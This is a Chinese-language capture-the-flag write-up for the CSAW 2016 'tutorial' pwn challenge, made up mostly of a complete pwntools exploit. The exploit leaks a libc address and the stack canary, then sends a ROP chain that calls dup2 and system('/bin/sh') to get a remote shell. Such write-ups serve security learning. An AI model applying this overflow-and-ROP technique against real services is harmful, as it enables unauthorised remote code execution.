title: CSAW 2016 tutorial writeup

date: 2016/09/19 16:48:00

---

200分的Pwn

同样也是拿到手简单跑一下就扔进IDA里静态看。
程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。

<!--more-->

由于已经给了libc就很好办了，拿了puts地址算system、"/bin/sh"地址，除此之外还要找一个dup2地址来把标准输出输入重定向到socket来，否则只是在服务端调用了system（这个一开始也没注意到，觉得没问题可是不见shell回来又折腾了一下才突然发现没重定向），然后来一波ROP就可以。

完整exploit：

```python
from pwn import *

#p=remote('127.0.0.1',9990)
p=remote('pwn.chal.csaw.io',8002)

poprdi=0x00000000004012e3 # pop rdi ; ret
poprsi=0x00000000004012e1 # pop rsi ; pop r15 ; ret
pick64 = lambda x: u64(x.ljust(8, '\0'))


p.recvuntil('>')
p.sendline('1')
p.recvuntil(':')
buf=p.recvline()
puts_addr=int(buf,16)+1280
print 'puts_addr: '+hex(puts_addr)

#system_addr=puts_addr-0x000000000006b990+0x0000000000041490
#str_sh=puts_addr-0x000000000006b990+0x1639a0
#dup2_addr=puts_addr-0x000000000006b990+0x00000000000dc490
system_addr=puts_addr-0x000000000006fd60+0x0000000000046590
str_sh=puts_addr-0x000000000006fd60+0x17c8c3
dup2_addr=puts_addr-0x000000000006fd60+0x00000000000ebe90
print 'system_addr: '+hex(system_addr)
print 'binsh_addr: '+hex(str_sh)


# ======== leak canary and stack address =========
payload='A'*4

p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline(payload)
leak=p.recvn(0x144)

canary=pick64(leak[-12:-4])
print 'canary: '+hex(canary)


# ======== ROP =========
payload2='A'*312
payload2+=p64(canary)*2

# dup2(4,1)
payload2+=p64(poprdi)
payload2+=p64(4)
payload2+=p64(poprsi)
payload2+=p64(1)*2
payload2+=p64(dup2_addr)

#dup2(4,0)
payload2+=p64(poprdi)
payload2+=p64(4)
payload2+=p64(poprsi)
payload2+=p64(0)*2
payload2+=p64(dup2_addr)

# system('/bin/sh')
payload2+=p64(poprdi)
payload2+=p64(str_sh)
payload2+=p64(system_addr)

p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline(payload2)
p.interactive()
```

